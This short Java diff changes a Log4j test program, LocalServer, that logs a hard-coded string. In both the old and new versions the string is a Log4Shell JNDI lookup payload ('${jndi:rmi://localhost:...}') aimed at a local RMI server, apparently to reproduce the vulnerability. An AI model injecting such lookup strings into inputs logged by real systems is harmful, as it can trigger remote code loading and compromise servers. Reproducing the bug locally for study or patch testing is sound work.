@@ -15,7 +15,7 @@ import org.apache.logging.log4j.Logger;
 public class LocalServer {
     private static final Logger logger = LogManager.getLogger();
     public static void main(String[] args) {
-        String input = "${jndi:rmi://localhost:2099/evil}";
+        String input = "${jndi:rmi://localhost:9999/Compute}";
         logger.info("hello1 {}", input);
     }
 }
